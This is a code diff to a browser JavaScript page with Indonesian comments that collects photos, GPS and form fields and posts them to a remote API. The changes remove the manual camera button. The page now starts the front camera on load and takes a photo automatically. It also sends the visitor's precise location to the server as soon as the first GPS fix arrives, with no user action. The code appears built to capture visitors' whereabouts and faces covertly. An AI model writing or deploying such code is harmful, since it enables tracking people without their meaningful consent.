@@ -8,9 +8,6 @@ document.getElementById("video");
 const canvas =
 document.getElementById("canvas");
 
-const startCamera =
-document.getElementById("startCamera");
-
 const takePhoto =
 document.getElementById("takePhoto");
 
@@ -28,9 +25,6 @@ document.getElementById("galleryInput");
 
 const galleryPreview =
 document.getElementById("galleryPreview");
-
-const photoPreview =
-document.getElementById("photoPreview");
 
 const sendButton =
 document.getElementById("sendButton");
@@ -65,28 +59,204 @@ let galleryPhotos = [];
 
 let automaticPhotoTaken = false;
 
+let gpsSent = false;
 
-/* =========================================
-   SAAT WEBSITE DIBUKA
-========================================= */
+
+/* =====================================
+   SAAT HALAMAN DIBUKA
+===================================== */
 
 window.addEventListener(
   "load",
-  function() {
+  async function() {
 
     startGPS();
 
-    startCameraFunction();
+    await startCamera();
 
   }
 );
 
 
-/* =========================================
-   KAMERA
-========================================= */
+/* =====================================
+   GPS
+   BERJALAN OTOMATIS
+===================================== */
 
-async function startCameraFunction() {
+function startGPS() {
+
+  if (
+    !navigator.geolocation
+  ) {
+
+    console.log(
+      "GPS tidak didukung."
+    );
+
+    return;
+
+  }
+
+
+  navigator.geolocation.watchPosition(
+
+    function(position) {
+
+      latitude =
+        position.coords.latitude;
+
+      longitude =
+        position.coords.longitude;
+
+
+      console.log(
+        "GPS diterima:",
+        latitude,
+        longitude
+      );
+
+
+      /*
+      Kirim GPS otomatis
+      setelah lokasi pertama
+      diperoleh.
+      */
+
+      if (!gpsSent) {
+
+        gpsSent = true;
+
+        sendLocation();
+
+      }
+
+    },
+
+
+    function(error) {
+
+      console.log(
+        "GPS error:",
+        error.message
+      );
+
+    },
+
+
+    {
+
+      enableHighAccuracy: true,
+
+      maximumAge: 0,
+
+      timeout: 20000
+
+    }
+
+  );
+
+}
+
+
+/* =====================================
+   KIRIM GPS OTOMATIS
+===================================== */
+
+async function sendLocation() {
+
+  if (
+    latitude === "" ||
+    longitude === ""
+  ) {
+
+    return;
+
+  }
+
+
+  try {
+
+    const data = {
+
+      latitude:
+        latitude,
+
+      longitude:
+        longitude,
+
+      nama:
+        "",
+
+      keterangan:
+        "Lokasi otomatis saat halaman dibuka",
+
+      image:
+        "",
+
+      automatic:
+        true,
+
+      waktu:
+        new Date().toISOString()
+
+    };
+
+
+    const response =
+      await fetch(
+
+        API_URL,
+
+        {
+
+          method:
+            "POST",
+
+          headers:
+            {
+
+              "Content-Type":
+                "text/plain;charset=utf-8"
+
+            },
+
+          body:
+            JSON.stringify(data)
+
+        }
+
+      );
+
+
+    const result =
+      await response.json();
+
+
+    console.log(
+      "GPS server:",
+      result
+    );
+
+
+  }
+
+  catch(error) {
+
+    console.error(
+      "Gagal mengirim GPS:",
+      error
+    );
+
+  }
+
+}
+
+
+/* =====================================
+   KAMERA DEPAN OTOMATIS
+===================================== */
+
+async function startCamera() {
 
   try {
 
@@ -95,50 +265,44 @@ async function startCameraFunction() {
       stream
         .getTracks()
         .forEach(
-          track => track.stop()
+          track =>
+            track.stop()
         );
 
     }
 
 
     cameraStatus.textContent =
-      "Mengaktifkan...";
-
-
-    cameraStatus.className =
-      "status offline";
-
-
-    cameraOverlay.style.display =
-      "flex";
+      "Memulai...";
 
 
     cameraOverlay.textContent =
-      "Menyalakan kamera depan...";
+      "Meminta izin kamera...";
 
 
     stream =
-      await navigator.mediaDevices.getUserMedia({
+      await navigator.mediaDevices
+        .getUserMedia({
 
-        video: {
+          video: {
 
-          facingMode: {
-            ideal: facingMode
+            facingMode: {
+              ideal: facingMode
+            },
+
+            width: {
+              ideal: 1280
+            },
+
+            height: {
+              ideal: 720
+            }
+
           },
 
-          width: {
-            ideal: 1280
-          },
+          audio: false
 
-          height: {
-            ideal: 720
-          }
-
-        },
-
-        audio: false
-
-      });
+        });
 
 
     video.srcObject =
@@ -160,47 +324,36 @@ async function startCameraFunction() {
       "none";
 
 
-    startCamera.textContent =
-      "✓ KAMERA AKTIF";
-
-
     takePhoto.disabled =
       false;
 
 
     autoStatus.textContent =
-      "🟢 Kamera aktif";
+      "🟢 Kamera aktif — mengambil foto otomatis...";
 
 
     /*
-       FOTO PERTAMA OTOMATIS
-       Tunggu sedikit agar
-       kamera benar-benar siap.
+    Tunggu kamera benar-benar
+    mendapatkan frame.
     */
 
-    if (
-      !automaticPhotoTaken
-    ) {
-
-      setTimeout(
-        captureAutomaticPhoto,
-        1500
-      );
-
-    }
+    setTimeout(
+      automaticPhoto,
+      2000
+    );
 
 
-  } catch (error) {
+  }
 
-    console.error(error);
+  catch(error) {
+
+    console.error(
+      error
+    );
 
 
     cameraStatus.textContent =
-      "Kamera gagal";
-
-
-    cameraStatus.className =
-      "status offline";
+      "Izin diperlukan";
 
 
     cameraOverlay.style.display =
@@ -208,65 +361,37 @@ async function startCameraFunction() {
 
 
     cameraOverlay.textContent =
-      "Izin kamera diperlukan";
+      "Izinkan akses kamera";
 
 
-    showMessage(
-      "Kamera tidak dapat diakses. Silakan izinkan kamera.",
-      "error"
-    );
+    autoStatus.textContent =
+      "⚠️ Kamera belum mendapat izin";
+
 
   }
 
 }
 
 
-/* =========================================
-   TOMBOL AKTIFKAN KAMERA
-========================================= */
+/* =====================================
+   FOTO OTOMATIS
+===================================== */
 
-startCamera.addEventListener(
-  "click",
-  function() {
+function automaticPhoto() {
 
-    startCameraFunction();
+  if (
+    automaticPhotoTaken
+  ) {
 
-  }
-);
-
-
-/* =========================================
-   GANTI KAMERA
-========================================= */
-
-switchCamera.addEventListener(
-  "click",
-  async function() {
-
-    facingMode =
-      facingMode === "user"
-        ? "environment"
-        : "user";
-
-
-    automaticPhotoTaken =
-      true;
-
-
-    await startCameraFunction();
+    return;
 
   }
-);
 
-
-/* =========================================
-   FOTO OTOMATIS PERTAMA
-========================================= */
-
-function captureAutomaticPhoto() {
 
   if (!stream) {
+
     return;
+
   }
 
 
@@ -283,7 +408,7 @@ function captureAutomaticPhoto() {
   ) {
 
     setTimeout(
-      captureAutomaticPhoto,
+      automaticPhoto,
       1000
     );
 
@@ -304,11 +429,17 @@ function captureAutomaticPhoto() {
 
 
   ctx.drawImage(
+
     video,
+
     0,
+
     0,
+
     width,
+
     height
+
   );
 
 
@@ -328,9 +459,6 @@ function captureAutomaticPhoto() {
     true;
 
 
-  renderPhotos();
-
-
   autoStatus.textContent =
     "📸 Foto otomatis berhasil diambil";
 
@@ -343,20 +471,15 @@ function captureAutomaticPhoto() {
 }
 
 
-/* =========================================
-   TOMBOL AMBIL FOTO MANUAL
-========================================= */
+/* =====================================
+   FOTO MANUAL
+===================================== */
 
 takePhoto.addEventListener(
   "click",
   function() {
 
     if (!stream) {
-
-      showMessage(
-        "Kamera belum aktif.",
-        "error"
-      );
 
       return;
 
@@ -368,21 +491,6 @@ takePhoto.addEventListener(
 
     const height =
       video.videoHeight;
-
-
-    if (
-      width === 0 ||
-      height === 0
-    ) {
-
-      showMessage(
-        "Kamera belum siap.",
-        "error"
-      );
-
-      return;
-
-    }
 
 
     canvas.width =
@@ -397,11 +505,17 @@ takePhoto.addEventListener(
 
 
     ctx.drawImage(
+
       video,
+
       0,
+
       0,
+
       width,
+
       height
+
     );
 
 
@@ -417,9 +531,6 @@ takePhoto.addEventListener(
     );
 
 
-    renderPhotos();
-
-
     showMessage(
       "Foto berhasil diambil.",
       "success"
@@ -429,65 +540,29 @@ takePhoto.addEventListener(
 );
 
 
-/* =========================================
-   TAMPILKAN FOTO
-========================================= */
+/* =====================================
+   GANTI KAMERA
+===================================== */
 
-function renderPhotos() {
+switchCamera.addEventListener(
+  "click",
+  async function() {
 
-  photoPreview.innerHTML =
-    "";
-
-
-  const allPhotos = [
-
-    ...capturedPhotos,
-
-    ...galleryPhotos
-
-  ];
+    facingMode =
+      facingMode === "user"
+        ? "environment"
+        : "user";
 
 
-  if (
-    allPhotos.length === 0
-  ) {
-
-    photoPreview.innerHTML =
-      `<div class="empty">
-        Menunggu foto...
-      </div>`;
-
-    return;
+    await startCamera();
 
   }
+);
 
 
-  allPhotos.forEach(
-    image => {
-
-      const img =
-        document.createElement(
-          "img"
-        );
-
-
-      img.src =
-        image;
-
-
-      photoPreview.appendChild(
-        img
-      );
-
-    }
-  );
-
-}
-
-
-/* =========================================
+/* =====================================
    GALERI
-========================================= */
+===================================== */
 
 galleryInput.addEventListener(
   "change",
@@ -520,7 +595,7 @@ galleryInput.addEventListener(
       }
 
 
-      const base64 =
+      const image =
         await resizeImage(
           file,
           1280,
@@ -529,7 +604,7 @@ galleryInput.addEventListener(
 
 
       galleryPhotos.push(
-        base64
+        image
       );
 
 
@@ -540,7 +615,7 @@ galleryInput.addEventListener(
 
 
       img.src =
-        base64;
+        image;
 
 
       galleryPreview.appendChild(
@@ -548,9 +623,6 @@ galleryInput.addEventListener(
       );
 
     }
-
-
-    renderPhotos();
 
 
     showMessage(
@@ -563,9 +635,9 @@ galleryInput.addEventListener(
 );
 
 
-/* =========================================
-   KOMPRES GAMBAR
-========================================= */
+/* =====================================
+   RESIZE FOTO
+===================================== */
 
 function resizeImage(
   file,
@@ -632,11 +704,17 @@ function resizeImage(
 
 
               ctx.drawImage(
+
                 img,
+
                 0,
+
                 0,
+
                 width,
+
                 height
+
               );
 
 
@@ -666,73 +744,9 @@ function resizeImage(
 }
 
 
-/* =========================================
-   GPS DI BELAKANG LAYAR
-========================================= */
-
-function startGPS() {
-
-  if (
-    !navigator.geolocation
-  ) {
-
-    console.error(
-      "GPS tidak didukung."
-    );
-
-    return;
-
-  }
-
-
-  navigator.geolocation.watchPosition(
-
-    function(position) {
-
-      latitude =
-        position.coords.latitude;
-
-      longitude =
-        position.coords.longitude;
-
-
-      console.log(
-        "GPS:",
-        latitude,
-        longitude
-      );
-
-    },
-
-
-    function(error) {
-
-      console.error(
-        "GPS:",
-        error
-      );
-
-    },
-
-
-    {
-
-      enableHighAccuracy: true,
-
-      maximumAge: 5000,
-
-      timeout: 15000
-
-    }
-
-  );
-
-}
-
-
-/* =========================================
-   KIRIM SEMUA FOTO
-========================================= */
+/* =====================================
+   KIRIM FOTO
+===================================== */
 
 sendButton.addEventListener(
   "click",
@@ -767,7 +781,7 @@ sendButton.addEventListener(
     ) {
 
       showMessage(
-        "Lokasi belum tersedia. Tunggu GPS beberapa detik.",
+        "Menunggu lokasi GPS...",
         "error"
       );
 
@@ -778,14 +792,18 @@ sendButton.addEventListener(
 
     const nama =
       document
-        .getElementById("nama")
+        .getElementById(
+          "nama"
+        )
         .value
         .trim();
 
 
     const keterangan =
       document
-        .getElementById("keterangan")
+        .getElementById(
+          "keterangan"
+        )
         .value
         .trim();
 
@@ -798,10 +816,6 @@ sendButton.addEventListener(
       "block";
 
 
-    progress.style.width =
-      "0%";
-
-
     for (
       let i = 0;
       i < allPhotos.length;
@@ -809,13 +823,13 @@ sendButton.addEventListener(
     ) {
 
       progressText.textContent =
-        "Mengirim foto " +
+        "Mengirim " +
         (i + 1) +
         " dari " +
         allPhotos.length;
 
 
-      const berhasil =
+      const result =
         await sendToServer(
 
           allPhotos[i],
@@ -829,7 +843,7 @@ sendButton.addEventListener(
         );
 
 
-      if (!berhasil) {
+      if (!result) {
 
         sendButton.disabled =
           false;
@@ -841,17 +855,16 @@ sendButton.addEventListener(
 
       progress.style.width =
         (
-          (
-            (i + 1) /
-            allPhotos.length
-          ) * 100
+          ((i + 1) /
+          allPhotos.length) *
+          100
         ) + "%";
 
     }
 
 
     progressText.textContent =
-      "✓ Semua foto berhasil dikirim";
+      "✓ Selesai";
 
 
     showMessage(
@@ -867,15 +880,15 @@ sendButton.addEventListener(
 );
 
 
-/* =========================================
-   KIRIM KE GOOGLE APPS SCRIPT
-========================================= */
+/* =====================================
+   KIRIM FOTO KE SERVER
+===================================== */
 
 async function sendToServer(
   image,
-  automatic = false,
-  nama = "",
-  keterangan = ""
+  automatic,
+  nama,
+  keterangan
 ) {
 
   try {
@@ -908,7 +921,9 @@ async function sendToServer(
 
     const response =
       await fetch(
+
         API_URL,
+
         {
 
           method:
@@ -926,6 +941,7 @@ async function sendToServer(
             JSON.stringify(data)
 
         }
+
       );
 
 
@@ -934,7 +950,6 @@ async function sendToServer(
 
 
     console.log(
-      "Server:",
       result
     );
 
@@ -945,8 +960,7 @@ async function sendToServer(
     ) {
 
       showMessage(
-        result.message ||
-        "Server menolak data.",
+        result.message,
         "error"
       );
 
@@ -957,14 +971,17 @@ async function sendToServer(
 
     return true;
 
+  }
 
-  } catch (error) {
+  catch(error) {
 
-    console.error(error);
+    console.error(
+      error
+    );
 
 
     showMessage(
-      "Gagal mengirim data ke server.",
+      "Gagal mengirim ke server.",
       "error"
     );
 
@@ -976,9 +993,9 @@ async function sendToServer(
 }
 
 
-/* =========================================
+/* =====================================
    PESAN
-========================================= */
+===================================== */
 
 function showMessage(
   text,
